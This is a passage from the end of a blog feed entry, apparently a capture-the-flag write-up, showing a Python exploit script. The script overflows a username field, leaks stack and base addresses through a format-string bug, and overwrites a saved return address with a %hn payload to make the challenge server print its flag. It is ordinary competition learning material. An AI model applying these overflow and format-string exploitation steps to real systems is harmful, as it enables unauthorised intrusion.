-    s=socket(AF_INET, SOCK_STREAM)
-    #s.connect(('localhost', 6666))
-    s.connect(('202.112.26.107', 10910))
-
-    #raw_input()
-
-    readtil('Login: ')
-    sendln('guest')
-    readtil('Password: ')
-    sendln('guest123')
-    readtil('choice: ')
-    sendln('2')
-    readtil('username:')
-    sendln("A"*256)     # overflow userflag
-    readtil('choice: ')
-    sendln('4')         # secret login menu
-
-
-    ### first string format vuln to read stack addr
-    readtil('Login: ')
-    # 43 found by lucky bruteforcing in combination with the 504 below. locally, it's at 15 and 41
-    sendln('%1$lp-%43$lp')
-    readtil('Password: ')
-    sendln('bleh')
-    data = readtil('login failed.')
-
-    m = re.findall(r'([a-f0-9]{5,})', data)
-    # find stack addr:
-    stack_addr = int(m[1], 16) 
-    base_addr = int(m[0], 16) - 0x1490
-
-    # base_addr was not necesssary in the final exploit, but was 
-    # instrumental in finding the right offset!
-    print "[+] Leaked address of base: {}".format(hex(base_addr))
-    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
-
-    readtil('Login: ')
-
-    # we need to return to base_addr + 0xfb3, because that function 
-    # is designed to read the flag &amp; spit it over the socket
-    print_offset = (base_addr &amp; 0xffff) + 0xfb3 - 2
-
-    print "[+] Offset format string with {} bytes".format(print_offset)
-
-    # send format string to overwrite saved return addr of 
-    sendln('%' + "%05d" % print_offset +'c___%10$hn'+q(stack_addr-504)) # should point to ret_addr at stack
-
-    readtil('Password: ')
-    sendln('bleh')
-
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.</p>
 ]]></content>
   </entry>
   
